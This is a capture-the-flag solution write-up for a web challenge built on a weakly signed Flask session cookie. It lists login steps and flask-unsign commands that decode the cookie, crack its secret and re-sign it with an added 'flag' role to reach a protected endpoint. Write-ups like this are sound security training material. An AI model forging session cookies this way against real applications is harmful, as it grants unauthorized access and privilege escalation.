## Category
Web

## Description
This challenge is based on the session token weak secret key
## Solution

1. Register and login into the application
2. Observe the response while logging to the application
3. In the response, we have authorization token
4. Click on the "Fix me" button on the home page
5. Observe the request to "/flag" and the session cookie
6. Modify the cookie to include {'role':'flag'} by using tools like flask-unsign or cookie-monster
7. Send a POST request to /flag with the authorization header(Step 3) and the modified session cookie to get the flag

```
https://github.com/Paradoxis/Flask-Unsign
flask-unsign --decode --cookie "eyJ1c2VyIjoicDNuN2E5MG4ifQ.YwDyzw.yQvQYU2EPcr1w6jz0JL8UruhFg"

flask-unsign --unsign --cookie "eyJ1c2VyIjoicDNuN2E5MG4ifQ.YwDyzw.yQvQYU2EPcr1w6jz0JL8UruhFg0"

flask-unsign --sign --cookie "{'user': 'p3n7a90n','role':'flag'}" --secret "temporary_key"

```
